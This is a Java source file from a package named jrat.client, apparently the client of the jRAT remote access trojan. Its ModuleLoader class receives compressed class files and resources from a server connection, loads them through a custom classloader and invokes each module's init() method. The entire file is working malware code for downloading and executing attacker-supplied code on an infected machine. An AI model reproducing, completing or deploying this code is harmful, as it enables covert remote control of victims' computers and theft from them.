package jrat.client.modules;

import com.sun.xml.internal.bind.v2.model.annotation.Quick;
import jrat.api.Module;
import jrat.client.Connection;
import jrat.client.Injector;
import jrat.client.InjectorClassloader;
import jrat.client.Main;
import jrat.common.compress.QuickLZ;

import java.lang.reflect.Method;

public class ModuleLoader {

    /**
     * Read and load modules
     * @param c
     * @throws Exception
     */
    public static void read(Connection c) throws Exception {
        int len = c.readInt();

        for (int i = 0; i < len; i++) {
            // Main module class
            String mainClass = c.readLine();
            Main.debug("receiving module " + mainClass);

            InjectorClassloader l = new InjectorClassloader(ModuleLoader.class.getClassLoader(), null);

            // read all classes and resources from the server
            while (c.readBoolean()) {
                boolean clazz = c.readBoolean();
                String name = c.readLine();

                int classLen = c.readInt();
                byte[] buffer = new byte[classLen];
                c.getDataInputStream().readFully(buffer);

                buffer =  QuickLZ.decompress(buffer);

                if (clazz) {
                    l.classes.put(Injector.getClassName(name), buffer);
                } else {
                    l.others.put(name, buffer);
                }

                Main.debug("\tclass " + name + " (" + classLen + " b)");
            }

            // load the main class
            Class<Module> module = (Class<Module>) l.loadClass(mainClass);
            Method method = module.getMethod("init");

            // invoke init()
            method.invoke(module.newInstance());
        }
    }
}
